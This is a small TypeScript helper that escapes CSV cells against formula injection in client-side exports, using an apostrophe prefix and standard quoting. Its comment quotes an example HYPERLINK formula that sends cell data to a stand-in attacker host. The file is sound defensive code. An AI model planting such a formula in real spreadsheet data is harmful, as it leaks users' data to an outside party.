// Shared CSV cell-escaping helper for client-side CSV exports.
//
// Neutralizes formula-trigger characters (=, +, -, @, tab, carriage return)
// that Excel/LibreOffice/Google Sheets interpret as the start of a formula,
// preventing formula/CSV injection (e.g. a student name of
// `=HYPERLINK("https://attacker.tld/?d="&A1&A2,"...")` executing when the
// exported file is opened in a spreadsheet app). Also applies standard CSV
// quoting/escaping for values containing commas, quotes, or newlines.
export function toCsvCell(value: unknown): string {
  let str = value == null ? '' : String(value);
  if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
  return /[",\n\r]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
}
